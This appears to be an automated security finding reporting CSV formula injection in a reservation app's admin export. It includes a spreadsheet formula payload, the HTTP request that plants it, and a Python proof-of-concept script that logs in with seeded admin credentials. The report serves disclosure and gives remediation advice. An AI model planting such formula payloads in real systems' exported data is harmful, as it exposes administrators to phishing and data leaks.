# CSV Formula Injection in Admin Venue Reservation Export

**ID:** vuln-0003
**Severity:** MEDIUM
**Found:** 2026-11-10 01:17:57 UTC
**Target:** http://host.docker.internal:3001
**Endpoint:** /admin/venues/{venueId}/export.csv
**Method:** GET
**CWE:** CWE-1236
**CVSS:** 4.3
**Confidence:** High
**Fix Effort:** Low

## Description

The public reservation endpoint accepts guest names beginning with spreadsheet formula syntax, and the admin venue CSV export emits that value without neutralization. An administrator opening the downloaded CSV in a spreadsheet can trigger the injected formula, enabling phishing or outbound navigation from the administrative workstation.

## Evidence

The attacker-controlled public request was accepted:

```http
POST /public/venues/bali/reservations HTTP/1.1
Content-Type: application/json

{"date":"2026-11-15","time":"19:00","partySize":2,"guestName":"=HYPERLINK(\"http://x\",\"x\")","phone":"0812345678","email":"x@example.com"}
```

The API returned booking code `GIOI-V93TGH7M`. The authenticated export response contained the same value as an executable formula:

```csv
01a1c306-4313-7658-b568-0754538f9953,GIOI-V93TGH7M,"=HYPERLINK(""http://x"",""x"")",0812345678,x@example.com,2,2026-11-15,19:00,pending,,
```

## Impact

An unauthenticated user can persist a formula in a reservation and have it delivered to administrators through `/admin/venues/{venueId}/export.csv`. When opened by a spreadsheet application, the `HYPERLINK` formula is interpreted rather than treated as text, allowing attacker-controlled navigation and potentially other spreadsheet actions depending on the client and formula payload.

## Counterevidence

The export endpoint requires an authenticated administrator, and CSV fields are correctly quoted for delimiter safety. Those controls do not neutralize formula-leading content: the reservation is created anonymously and the exported field still starts with `=`, which spreadsheet clients interpret as a formula. The PoC demonstrates persistence and delivery; execution depends on the normal administrative workflow of opening the export.

## What Would Change This Severity

Confirmation that exported files are automatically opened or processed by a spreadsheet client without warning would raise impact; confirmed formula execution that exfiltrates protected data would raise confidentiality and severity.

## Technical Analysis

`POST /public/venues/bali/reservations` stores `guestName` beginning with `=HYPERLINK(...)`. The authenticated export endpoint serializes the stored value as a quoted CSV field (`"=HYPERLINK(...)"`) but does not prepend a single quote or otherwise neutralize formula-leading characters. CSV quoting only escapes delimiters and does not prevent spreadsheet formula evaluation.

## Proof of Concept

1. Submit a reservation to the public Bali venue endpoint with `guestName` set to `=HYPERLINK("http://x","x")` and valid reservation details.
2. Authenticate as the seeded administrator and request `/admin/venues/01a1b416-566e-7288-9725-6c2b92ad2bed/export.csv`.
3. Locate the created booking code `GIOI-V93TGH7M` in the CSV and open the file in a spreadsheet application.
4. Observe that the `guest_name` cell begins with an executable `HYPERLINK` formula instead of literal text.

```python
import requests

base = "http://host.docker.internal:3001"
s = requests.Session()

reservation = {
    "date": "2026-11-15",
    "time": "19:00",
    "partySize": 2,
    "guestName": '=HYPERLINK("http://x","x")',
    "phone": "0812345678",
    "email": "x@example.com",
}
r = s.post(f"{base}/public/venues/bali/reservations", json=reservation)
r.raise_for_status()
print(r.json())

login = s.post(f"{base}/staff/login", json={"username": "admin", "password": "password"})
login.raise_for_status()
export = s.get(f"{base}/admin/venues/01a1b416-566e-7288-9725-6c2b92ad2bed/export.csv")
export.raise_for_status()
assert '=HYPERLINK(""http://x"",""x"")' in export.text
print("formula present in exported CSV")
```

## Remediation

Neutralize spreadsheet formula prefixes in every exported cell derived from user-controlled data. Before CSV serialization, prefix values whose first non- whitespace character is one of `=`, `+`, `-`, or `@` with a single quote (or use an equivalent proven CSV-injection mitigation), while preserving CSV quoting. Apply the same policy to all export fields and add regression tests covering formula prefixes and leading whitespace.

## Assumptions

The administrator or staff member opens the downloaded CSV in a spreadsheet application that evaluates formulas. The demonstrated payload uses only the documented public reservation flow and does not require an attacker account.
